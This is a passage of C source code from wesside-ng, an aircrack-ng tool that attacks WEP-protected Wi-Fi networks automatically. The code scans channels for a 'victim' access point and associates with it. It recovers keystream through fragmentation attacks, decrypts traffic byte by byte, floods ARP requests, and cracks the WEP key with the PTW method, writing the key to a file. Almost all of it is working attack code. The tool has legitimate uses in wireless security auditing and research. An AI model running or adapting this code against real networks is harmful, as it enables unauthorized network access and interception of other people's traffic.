			char * mac_p = mac2string(ws->ws_mymac);
			ALLEGE(mac_p != NULL);
			time_print("Trying to use MAC=(%s)\n", mac_p);
			free(mac_p);
			ws->ws_state = FOUND_VICTIM;
			return;
		}

		// wep data!
		if ((wh->i_fc[1] & IEEE80211_FC1_WEP) && dlen > (4 + 8 + 4))
		{
			got_wep(ws, wh, rd);
		}
	}
}

static void anal(struct wstate * ws, unsigned char * buf, int rd) // yze
{
	REQUIRE(ws != NULL);
	REQUIRE(buf != NULL);

	struct ieee80211_frame * wh = (struct ieee80211_frame *) buf;
	int type, stype;
	static int lastseq = -1;
	int seq;
	unsigned short * seqptr;
	int for_us = 0;

	if (rd < 1)
	{
		time_print("rd=%d\n", rd);
		exit(EXIT_FAILURE);
	}

	type = wh->i_fc[0] & IEEE80211_FC0_TYPE_MASK;
	stype = wh->i_fc[0] & IEEE80211_FC0_SUBTYPE_MASK;

	// sort out acks
	if (ws->ws_state >= FOUND_VICTIM)
	{
		// stuff for us
		if (memcmp(wh->i_addr1, ws->ws_mymac, 6) == 0)
		{
			for_us = 1;
			if (type != IEEE80211_FC0_TYPE_CTL) send_ack(ws);
		}
	}

	// XXX i know it aint great...
	seqptr = (unsigned short *) wh->i_seq;
	seq = (le16toh(*seqptr) & IEEE80211_SEQ_SEQ_MASK)
		  >> IEEE80211_SEQ_SEQ_SHIFT;
	if (seq == lastseq && (wh->i_fc[1] & IEEE80211_FC1_RETRY)
		&& type != IEEE80211_FC0_TYPE_CTL)
	{
		//		printf("Ignoring dup packet... seq=%d\n", seq);
		return;
	}
	lastseq = seq;

	// management frame
	if (type == IEEE80211_FC0_TYPE_MGT)
	{
		if (ws->ws_state == FIND_VICTIM)
		{
			if (stype == IEEE80211_FC0_SUBTYPE_BEACON
				|| stype == IEEE80211_FC0_SUBTYPE_PROBE_RESP)
			{

				if (get_victim_ssid(ws, wh, rd))
				{
					return;
				}
			}
		}
	}

	if (ws->ws_state >= FOUND_VICTIM)
	{
		// stuff for us
		if (for_us)
		{
			stuff_for_us(ws, wh, rd);
		}

		// stuff in network [even for us]
		if (((wh->i_fc[1] & IEEE80211_FC1_DIR_TODS)
			 && (memcmp(ws->ws_bss, wh->i_addr1, 6) == 0))
			||

			((wh->i_fc[1] & IEEE80211_FC1_DIR_FROMDS)
			 && (memcmp(ws->ws_bss, wh->i_addr2, 6) == 0)))
		{
			stuff_for_net(ws, wh, rd);
		}
	}
}

static void do_arp(unsigned char * buf,
				   unsigned short op,
				   unsigned char * m1,
				   char * i1,
				   unsigned char * m2,
				   char * i2)
{
	REQUIRE(buf != NULL);
	REQUIRE(m1 != NULL);
	REQUIRE(m2 != NULL);
	REQUIRE(i1 != NULL);
	REQUIRE(i2 != NULL);

	struct in_addr sip;
	struct in_addr dip;
	struct arphdr * h;
	unsigned char * data;

	inet_aton(i1, &sip);
	inet_aton(i2, &dip);
	h = (struct arphdr *) buf;

	memset(h, 0, sizeof(*h));

	h->ar_hrd = htons(ARPHRD_ETHER);
	h->ar_pro = htons(ETHERTYPE_IP);
	h->ar_hln = 6;
	h->ar_pln = 4;
	h->ar_op = htons(op);

	data = (unsigned char *) h + sizeof(*h);

	memcpy(data, m1, 6);
	data += 6;
	memcpy(data, &sip, 4);
	data += 4;

	memcpy(data, m2, 6);
	data += 6;
	memcpy(data, &dip, 4);
#if 0
	data += 4;
#endif
}

static void
send_fragment(struct wstate * ws, struct frag_state * fs, struct prga_info * pi)
{
	REQUIRE(ws != NULL);
	REQUIRE(fs != NULL);
	REQUIRE(pi != NULL);

	unsigned char buf[sizeof(struct ieee80211_frame) * 16]
		__attribute__((aligned(8)));
	struct ieee80211_frame * wh;
	unsigned char * body;
	int fragsize;
	uLong crc;
	unsigned int * pcrc;
	int i;
	unsigned short * seq;
	unsigned short sn, fn;

	wh = (struct ieee80211_frame *) buf;
	memcpy(wh, &fs->fs_wh, sizeof(*wh)); //-V512

	body = (unsigned char *) wh + sizeof(*wh);
	memcpy(body, &pi->pi_iv, 3);
	body += 3;
	*body++ = 0; // key index

	fragsize = fs->fs_data + fs->fs_len - fs->fs_ptr;

	ALLEGE(fragsize > 0);

	if ((fragsize + 4) > pi->pi_len)
	{
		fragsize = pi->pi_len - 4;
		wh->i_fc[1] |= IEEE80211_FC1_MORE_FRAG;
	}
	// last fragment
	else
	{
		wh->i_fc[1] &= ~IEEE80211_FC1_MORE_FRAG;
	}

	memcpy(body, fs->fs_ptr, fragsize);

	crc = crc32(0L, Z_NULL, 0);
	crc = crc32(crc, body, fragsize);
	pcrc = (unsigned int *) (body + fragsize); //-V1032
	*pcrc = htole32(crc);

	ALLEGE(fragsize < INT_MAX - 4);
	for (i = 0;
		 i < (fragsize + 4) && (size_t) i < (sizeof(buf) - sizeof(*wh) - 1);
		 i++)
		body[i] ^= pi->pi_prga[i];

	seq = (unsigned short *) &wh->i_seq;
	sn = (le16toh(*seq) & IEEE80211_SEQ_SEQ_MASK) >> IEEE80211_SEQ_SEQ_SHIFT;
	fn = le16toh(*seq) & IEEE80211_SEQ_FRAG_MASK;
	//	printf ("Sent frag (data=%d) (seq=%d fn=%d)\n", fragsize, sn, fn);

	send_frame(ws, buf, sizeof(*wh) + 4 + fragsize + 4);

	seq = (unsigned short *) &fs->fs_wh.i_seq;
	*seq = fnseq(++fn, sn);
	fs->fs_ptr += fragsize;

	if (fs->fs_ptr - fs->fs_data == fs->fs_len)
	{
		//		printf("Finished sending frags...\n");
		fs->fs_waiting_relay = 1;
	}
}

static void
prepare_fragstate(struct wstate * ws, struct frag_state * fs, int pad)
{
	REQUIRE(fs != NULL);

	fs->fs_waiting_relay = 0;
	fs->fs_len = 8 + 8 + 20 + pad;
	fs->fs_data = (unsigned char *) malloc(fs->fs_len);

	if (!fs->fs_data)
	{
		perror("malloc()");
		exit(EXIT_FAILURE);
	}

	REQUIRE(ws != NULL);

	fs->fs_ptr = fs->fs_data;

	do_llc(fs->fs_data, ETHERTYPE_ARP);
	do_arp(&fs->fs_data[8],
		   ARPOP_REQUEST,
		   ws->ws_mymac,
		   ws->ws_myip,
		   (unsigned char *) "\x00\x00\x00\x00\x00\x00",
		   "192.168.0.1");

	memset(&fs->fs_wh, 0, sizeof(fs->fs_wh));
	fill_basic(ws, &fs->fs_wh);

	memset(fs->fs_wh.i_addr3, 0xff, 6);
	fs->fs_wh.i_fc[0] |= IEEE80211_FC0_TYPE_DATA;
	fs->fs_wh.i_fc[1]
		|= IEEE80211_FC1_DIR_TODS | IEEE80211_FC1_MORE_FRAG | IEEE80211_FC1_WEP;

	memset(&fs->fs_data[8 + 8 + 20], 0, pad);
}

static void discover_prga(struct wstate * ws)
{
	REQUIRE(ws != NULL);

	// create packet...
	if (!ws->ws_fs.fs_data)
	{
		int pad = 0;

		if (ws->ws_pi.pi_len >= 20) pad = ws->ws_pi.pi_len * 3;

		prepare_fragstate(ws, &ws->ws_fs, pad);
	}

	if (!ws->ws_fs.fs_waiting_relay)
	{
		send_fragment(ws, &ws->ws_fs, &ws->ws_pi);
		if (ws->ws_fs.fs_waiting_relay)
		{
			if (gettimeofday(&ws->ws_fs.fs_last, NULL) == -1)
				err(1, "gettimeofday()");
		}
	}
}

static void decrypt(struct wstate * ws)
{
	REQUIRE(ws != NULL);

	// gotta initiate
	if (!ws->ws_dfs.fs_data)
	{
		prepare_fragstate(ws, &ws->ws_dfs, 0);

		memcpy(ws->ws_dfs.fs_wh.i_addr3, MCAST_PREF, 5);

		ws->ws_dfs.fs_wh.i_addr3[5] = ws->ws_dpi.pi_prga[ws->ws_dpi.pi_len - 1];

		ws->ws_dpi.pi_len++;
	}

	// guess diff prga byte...
	if (ws->ws_dfs.fs_waiting_relay)
	{
		unsigned short seq;
		ws->ws_dpi.pi_prga[ws->ws_dpi.pi_len - 1]++;

		ws->ws_dfs.fs_wh.i_addr3[5] = ws->ws_dpi.pi_prga[ws->ws_dpi.pi_len - 1];

		ws->ws_dfs.fs_waiting_relay = 0;
		ws->ws_dfs.fs_ptr = ws->ws_dfs.fs_data;

		seq = fnseq(0, ws->ws_psent);
		ws->ws_dfs.fs_wh.i_seq[0] = (uint8_t)(seq >> 8);
		ws->ws_dfs.fs_wh.i_seq[1] = (uint8_t)(seq % 256);
	}

	send_fragment(ws, &ws->ws_dfs, &ws->ws_dpi);
}

static void send_arp(struct wstate * ws,
					 unsigned short op,
					 char * srcip,
					 unsigned char * srcmac,
					 char * dstip,
					 unsigned char * dstmac)
{
	static unsigned char arp_pkt[sizeof(struct ieee80211_frame) * 16];
	unsigned char * body;
	unsigned char * ptr;
	struct ieee80211_frame * wh;
	int arp_len;

	memset(arp_pkt, 0, sizeof(arp_pkt));

	// construct ARP
	wh = (struct ieee80211_frame *) arp_pkt;
	fill_basic(ws, wh);

	wh->i_fc[0] |= IEEE80211_FC0_TYPE_DATA;
	wh->i_fc[1] |= IEEE80211_FC1_WEP | IEEE80211_FC1_DIR_TODS;
	memset(wh->i_addr3, 0xff, 6);

	body = (unsigned char *) wh + sizeof(*wh);
	ptr = body;
	ptr += 4; // iv

	do_llc(ptr, ETHERTYPE_ARP);
	ptr += 8;
	do_arp(ptr, op, srcmac, srcip, dstmac, dstip);

	wepify(ws, body, 8 + 8 + 20);
	arp_len = sizeof(*wh) + 4 + 8 + 8 + 20 + 4;
	assert(arp_len < (int) sizeof(arp_pkt)); //-V547

	send_frame(ws, arp_pkt, arp_len);
}

static int find_mac(struct wstate * ws)
{
	REQUIRE(ws != NULL);

	if (!(ws->ws_netip && !ws->ws_rtrmac)) return (0);

	if (gettimeofday(&ws->ws_arpsend, NULL) == -1) err(1, "gettimeofday()");

	time_print("Sending arp request for: %s\n", ws->ws_netip);
	send_arp(ws,
			 ARPOP_REQUEST,
			 ws->ws_myip,
			 ws->ws_mymac,
			 ws->ws_netip,
			 (unsigned char *) "\x00\x00\x00\x00\x00\x00");

	// XXX lame
	ws->ws_rtrmac = (unsigned char *) 1;

	return (1);
}

static int flood(struct wstate * ws)
{
	REQUIRE(ws != NULL);

	if (!(ws->ws_rtrmac > (unsigned char *) 1 && ws->ws_netip)) return (0);

	// could ping broadcast....
	send_arp(ws,
			 ARPOP_REQUEST,
			 ws->ws_myip,
			 ws->ws_mymac,
			 ws->ws_netip,
			 (unsigned char *) "\x00\x00\x00\x00\x00\x00");

	return (1);
}

static void can_write(struct wstate * ws)
{
	REQUIRE(ws != NULL);

	switch (ws->ws_state)
	{
		case FOUND_VICTIM:
			send_auth(ws);
			ws->ws_state = SENDING_AUTH;
			break;

		case GOT_AUTH:
			send_assoc(ws);
			ws->ws_state = SENDING_ASSOC;
			break;

		case GOT_ASSOC:
			if (ws->ws_pi.pi_prga && ws->ws_pi.pi_len < ws->ws_min_prga)
			{
				discover_prga(ws);
				break;
			}

			if (ws->ws_cipher)
			{
				decrypt(ws);
				break;
			}

			if (!ws->ws_pi.pi_prga) break;

			// try to find rtr mac addr
			if (find_mac(ws)) break;

			// need to generate traffic...
			if (flood(ws)) break;

			break;
	}
}

static void save_key(unsigned char * key, int len)
{
	REQUIRE(key != NULL);

	char tmp[16];
	char k[64];
	int fd;
	int rd;

	REQUIRE(len * 3 < (int) sizeof(k));

	k[0] = 0;
	while (len--)
	{
		snprintf(tmp, 3, "%.2X", *key++);
		strlcat(k, tmp, sizeof(k));
		if (len) strncat(k, ":", 2);
	}

	fd = open(
		KEY_FILE, O_WRONLY | O_CREAT, S_IRUSR | S_IWUSR | S_IRGRP | S_IROTH);
	if (fd == -1) err(1, "open()");

	printf("\nKey: %s\n", k);
	rd = write(fd, k, strlen(k));
	if (rd == -1) err(1, "write()");
	if (rd != (int) strlen(k)) errx(1, "write %d/%d\n", rd, (int) strlen(k));
	close(fd);
}

static int do_crack(struct wstate * ws)
{
	unsigned char key[PTW_KEYHSBYTES];
	int(*all)[256];
	int i, j;

	all = malloc(32 * sizeof(int[256]));
	if (all == NULL)
	{
		return (1);
	}

	// initial setup (complete keyspace)
	for (i = 0; i < 32; i++)
	{
		for (j = 0; j < 256; j++)
		{
			all[i][j] = 1;
		}
	}

	REQUIRE(ws != NULL);

	if (PTW_computeKey(ws->ws_ptw, key, 13, KEYLIMIT, PTW_DEFAULTBF, all, 0)
		== 1)
	{
		save_key(key, 13);
		free(all);
		return (1);
	}
	if (PTW_computeKey(ws->ws_ptw, key, 5, KEYLIMIT / 10, PTW_DEFAULTBF, all, 0)
		== 1)
	{
		save_key(key, 5);
		free(all);
		return (1);
	}

	free(all);
	return (0);
}

static void sigchild(int x)
{
	UNUSED_PARAM(x);

	struct wstate * ws;

	ws = get_ws();

	ALLEGE(ws != NULL); //-V547

	ws->ws_crack_pid = 0; /* crack done */
}

static void try_crack(struct wstate * ws)
{
	REQUIRE(ws != NULL);

	if (ws->ws_crack_pid)
	{
		printf("\n");
		time_print("Warning... previous crack still running!\n");
		kill_crack(ws);
	}

	if (ws->ws_fd)
	{
		if (fsync(ws->ws_fd) == -1) err(1, "fsync");
	}

	ws->ws_crack_pid = fork();

	if (ws->ws_crack_pid == -1) err(1, "fork");

	// child
	if (ws->ws_crack_pid == 0)
	{
		if (!do_crack(ws))
		{
			printf("\n");
			time_print("Crack unsuccessful\n");
		}
		exit(EXIT_FAILURE);
	}

	// parent
	printf("\n");
	time_print("Starting crack PID=%d\n", ws->ws_crack_pid);
	if (gettimeofday(&ws->ws_crack_start, NULL) == -1) err(1, "gettimeofday");

	ws->ws_wep_thresh += ws->ws_thresh_incr;
}

static void open_wepfile(struct wstate * ws)
{
	REQUIRE(ws != NULL);

	ws->ws_fd = open(WEP_FILE, O_WRONLY | O_APPEND);
	if (ws->ws_fd == -1)
	{
		struct pcap_file_header pfh;

		memset(&pfh, 0, sizeof(pfh));
		pfh.magic = TCPDUMP_MAGIC;
		pfh.version_major = PCAP_VERSION_MAJOR;
		pfh.version_minor = PCAP_VERSION_MINOR;
		pfh.thiszone = 0;
		pfh.sigfigs = 0;
		pfh.snaplen = 65535;
		pfh.linktype = LINKTYPE_IEEE802_11;

		ws->ws_fd = open(WEP_FILE,
						 O_WRONLY | O_CREAT,
						 S_IRUSR | S_IWUSR | S_IRGRP | S_IROTH);
		if (ws->ws_fd != -1)
		{
			if (write(ws->ws_fd, &pfh, sizeof(pfh)) != sizeof(pfh))
				err(1, "write()");
		}
	}
	else
	{
		time_print("WARNING: Appending in %s\n", WEP_FILE);
	}

	if (ws->ws_fd == -1) err(1, "open()");
}

static void load_prga(struct wstate * ws)
{
	int fd, rd;
	unsigned char buf[4096];

	fd = open(PRGA_FILE, O_RDONLY);
	if (fd != -1)
	{
		time_print("WARNING: reading prga from %s\n", PRGA_FILE);
		rd = read(fd, buf, sizeof(buf));
		if (rd == -1)
		{
			perror("read()");
			exit(EXIT_FAILURE);
		}
		if (rd >= 8)
		{
			set_prga(ws, buf, NULL, &buf[3], rd - 3);
		}

		close(fd);
	}
}

static void check_relay_timeout(struct wstate * ws, struct timeval * now)
{
	REQUIRE(ws != NULL);

	if (!ws->ws_fs.fs_waiting_relay) return;

	int el = elapsed_time_diff(&ws->ws_fs.fs_last, now);

	if (el > (1500 * 1000))
	{
		free(ws->ws_fs.fs_data);
		ws->ws_fs.fs_data = 0;
	}
}

static void check_arp_timeout(struct wstate * ws, struct timeval * now)
{
	REQUIRE(ws != NULL);

	if (ws->ws_rtrmac != (unsigned char *) 1) return;

	int el = elapsed_time_diff(&ws->ws_arpsend, now);
	if (el >= (1500 * 1000))
	{
		ws->ws_rtrmac = 0;
	}
}

static void display_status_bar(struct wstate * ws,
							   struct timeval * now,
							   struct timeval * last_status,
							   char * pbarp)
{
	int el;

	el = elapsed_time_diff(last_status, now);
	if (el < 100 * 1000) return;

	if (ws->ws_crack_pid) check_key(ws);

	if (ws->ws_netip && ws->ws_pi.pi_len >= ws->ws_min_prga
		&& ws->ws_rtrmac > (unsigned char *) 1)
	{
		time_print("WEP=%.9d (next crack at %d) "
				   "IV=%.2x:%.2x:%.2x (rate=%d)            \r",
				   ws->ws_packets,
				   ws->ws_wep_thresh,
				   ws->ws_iv[0],
				   ws->ws_iv[1],
				   ws->ws_iv[2],
				   ws->ws_rate);
	}
	else
	{
		if (ws->ws_state == FIND_VICTIM)
		{
			time_print("Chan %.02d %c\r", ws->ws_chan, *pbarp);
		}
		else if (ws->ws_cipher)
		{
			int pos = ws->ws_dpi.pi_len - 1;
			unsigned char prga = ws->ws_dpi.pi_prga[pos];

			ALLEGE(pos != 0);

			time_print("Guessing PRGA %.2x (IP byte=%d)    \r",
					   prga,
					   ws->ws_cipher[pos] ^ prga);
		}
		else
			time_print("%c\r", *pbarp);
	}

	fflush(stdout);

	memcpy(last_status, now, sizeof(*last_status));
}

static void check_tx(struct wstate * ws, struct timeval * now)
{
	REQUIRE(ws != NULL);

	if (!ws->ws_waiting_ack) return;

	int elapsed = elapsed_time_diff(&ws->ws_tsent, now);
	if (elapsed >= (int) ws->ws_ack_timeout) send_frame(ws, NULL, -1);
}

static void check_hop(struct wstate * ws, struct timeval * now)
{
	REQUIRE(ws != NULL);

	int elapsed;
	int chan = ws->ws_chan;

	elapsed = elapsed_time_diff(&ws->ws_lasthop, now);
	if (elapsed < 300 * 1000) return;

	chan++;
	if (chan > ws->ws_max_chan) chan = 1;

	set_chan(ws, chan);
	memcpy(&ws->ws_lasthop, now, sizeof(ws->ws_lasthop));
}

static void post_input(struct wstate * ws, struct timeval * now)
{
	REQUIRE(ws != NULL);

	int el;

	// check state and what we do next.
	if (ws->ws_state == FIND_VICTIM)
	{
		check_hop(ws, now);
		return;
	}

	// check if we need to write something...
	if (!ws->ws_waiting_ack) can_write(ws);

	el = elapsed_time_diff(&ws->ws_last_wcount, now);

	/* calculate rate, roughtly */
	if (el < 1 * 1000 * 1000) return;

	ws->ws_rate = ws->ws_packets - ws->ws_last_wep_count;
	ws->ws_last_wep_count = ws->ws_packets;

	memcpy(&ws->ws_last_wcount, now, sizeof(ws->ws_last_wcount));

	if (ws->ws_wep_thresh != -1
		&& ws->ws_packets > (unsigned int) ws->ws_wep_thresh)
		try_crack(ws);
}

static void do_input(struct wstate * ws)
{
	unsigned char buf[4096];
	int rd;

	rd = wi_read(ws->ws_wi, NULL, NULL, buf, sizeof(buf), NULL);
	if (rd == 0) return;
	if (rd == -1)
	{
		perror("read()");
		exit(EXIT_FAILURE);
	}

	// input
	anal(ws, buf, rd);
}

static void own(struct wstate * ws)
{
	REQUIRE(ws != NULL);

	int rd;
	fd_set rfd;
	struct timeval tv;
	char * pbar = "/-\\|";
	char * pbarp = &pbar[0];
	struct timeval now;
	struct timeval last_status;
	int largest;
	int wifd;

	wifd = wi_fd(ws->ws_wi);

	open_wepfile(ws);
	load_prga(ws);

	largest = wi_fd(ws->ws_wi);

	if (signal(SIGINT, &cleanup) == SIG_ERR)
	{
		perror("signal()");
		exit(EXIT_FAILURE);
	}
	if (signal(SIGTERM, &cleanup) == SIG_ERR)
	{
		perror("signal()");
		exit(EXIT_FAILURE);
	}
	if (signal(SIGCHLD, &sigchild) == SIG_ERR)
	{
		perror("signal()");
		exit(EXIT_FAILURE);
	}

	time_print("Looking for a victim...\n");

	if (gettimeofday(&ws->ws_lasthop, NULL) == -1)
	{
		perror("gettimeofday()");
		exit(EXIT_FAILURE);
	}
	memcpy(&ws->ws_last_wcount, &ws->ws_lasthop, sizeof(ws->ws_last_wcount));
	memcpy(&last_status, &ws->ws_lasthop, sizeof(last_status));

	while (1)
	{
		if (gettimeofday(&now, NULL) == -1)
		{
			perror("gettimeofday()");
			exit(EXIT_FAILURE);
		}

		/* check for relay timeout */
		check_relay_timeout(ws, &now);

		/* check for arp timeout */
		check_arp_timeout(ws, &now);

		// status bar
		display_status_bar(ws, &now, &last_status, pbarp);

		// check if we are cracking
		if (ws->ws_crack_pid)
		{
			if ((now.tv_sec - ws->ws_crack_start.tv_sec) >= ws->ws_crack_dur)
				kill_crack(ws);
		}

		// check TX / retransmit
		check_tx(ws, &now);

		// INPUT
		// select
		FD_ZERO(&rfd);
		FD_SET(wifd, &rfd);
		tv.tv_sec = 0;
		tv.tv_usec = 1000 * 10;

		rd = select(largest + 1, &rfd, NULL, NULL, &tv);
		if (rd == -1)
		{
			switch (errno)
			{
				case EINTR: /* handle SIGCHLD */
					break;
				default:
					perror("select()");
					exit(EXIT_FAILURE);
					break;
			}
		}

		// read
		if (rd != 0 && FD_ISSET(wifd, &rfd))
		{
			/* update status */
			pbarp++;
			if (!(*pbarp)) pbarp = &pbar[0];

			do_input(ws);
		}

		post_input(ws, &now);
	}
}

static void start(struct wstate * ws, char * dev)
{
	REQUIRE(ws != NULL);

	struct wif * wi;

	ws->ws_wi = wi = wi_open(dev);
	if (!wi) err(1, "wi_open(%s)", dev);

	if (!ws->ws_have_mac)
	{
		if (wi_get_mac(wi, ws->ws_mymac) == -1) printf("Can't get mac\n");
	}
	else
	{
		if (wi_set_mac(wi, ws->ws_mymac) == -1) printf("Can't set mac\n");
	}

	char * mac = mac2string(ws->ws_mymac);
	ALLEGE(mac != NULL);
	time_print("Using mac %s\n", mac);
	free(mac);

	ws->ws_ptw = PTW_newattackstate();
	if (!ws->ws_ptw) err(1, "PTW_newattackstate()");

	own(ws);

	wi_close(wi);
}

static void usage(char * pname)
{
	UNUSED_PARAM(pname);

	char * version_info
		= getVersion("Wesside-ng", _MAJ, _MIN, _SUB_MIN, _REVISION, _BETA, _RC);
	printf("\n"
		   "  %s - (C) 2007, 2008, 2009 Andrea Bittau\n"
		   "  https://www.aircrack-ng.org\n"
		   "\n"
		   "  Usage: wesside-ng <options>\n"
		   "\n"
		   "  Options:\n"
		   "\n"
		   "       -h              : This help screen\n"
		   "       -i      <iface> : Interface to use (mandatory)\n"
		   "       -m      <my ip> : My IP address\n"
		   "       -n     <net ip> : Network IP address\n"
		   "       -a      <mymac> : Source MAC Address\n"
		   "       -c              : Do not crack the key\n"
		   "       -p   <min prga> : Minimum bytes of PRGA to gather\n"
		   "       -v <victim mac> : Victim BSSID\n"
		   "       -t  <threshold> : Cracking threshold\n"
		   "       -f   <max chan> : Highest scanned chan (default: 11)\n"
		   "       -k      <txnum> : Ignore acks and tx txnum times\n"
		   "\n",
		   version_info);
	free(version_info);
	exit(EXIT_SUCCESS);
}

static void init_defaults(struct wstate * ws)
{
	REQUIRE(ws != NULL);

	memset(ws, 0, sizeof(*ws));

	ws->ws_state = FIND_VICTIM;
	ws->ws_max_chan = 11;
	memcpy(ws->ws_mymac, "\x00\x00\xde\xfa\xce\x0d", 6);
	ws->ws_have_mac = 0;
	strncpy(ws->ws_myip, "192.168.0.123", sizeof(ws->ws_myip) - 1);
	ws->ws_ack_timeout = 100 * 1000;
	ws->ws_min_prga = 128;
	ws->ws_wep_thresh = ws->ws_thresh_incr = 10000;
	ws->ws_crack_dur = 60;
}

int main(int argc, char * argv[])
{
	struct wstate * ws = get_ws();
	int ch;
	unsigned char vic[6];
	char * dev = "IdidNotSpecifyAnInterface";

	ALLEGE(ws != NULL); //-V547
	init_defaults(ws);

	if (gettimeofday(&ws->ws_real_start, NULL) == -1)
	{
		perror("gettimeofday()");
		exit(EXIT_FAILURE);
	}

	while ((ch = getopt(argc, argv, "hi:m:a:n:cp:v:t:f:k:")) != -1)
	{
		switch (ch)
		{
			case 'k':
				ws->ws_ignore_ack = atoi(optarg);
				break;

			case 'a':
				str2mac(ws->ws_mymac, optarg);
				ws->ws_have_mac = 1;
				break;

			case 'i':
				dev = optarg;
				break;

			case 'm':
				strncpy(ws->ws_myip, optarg, sizeof(ws->ws_myip) - 1);
				ws->ws_myip[sizeof(ws->ws_myip) - 1] = 0;
				break;

			case 'n':
				ws->ws_netip = optarg;
				break;

			case 'v':
				str2mac(vic, optarg);
				ws->ws_victim_mac = vic; //-V507
				break;

			case 'c':
				ws->ws_wep_thresh = -1;
				break;

			case 'p':
				ws->ws_min_prga = atoi(optarg);
				break;

			case 't':
				ws->ws_thresh_incr = ws->ws_wep_thresh = atoi(optarg);
				break;

			case 'f':
				ws->ws_max_chan = atoi(optarg);
				break;

			default:
				usage(argv[0]);
				break;
		}
	}

	if (argc > 1)
		start(ws, dev);
	else
		usage(argv[0]);

	cleanup(0);
	exit(EXIT_SUCCESS);
}
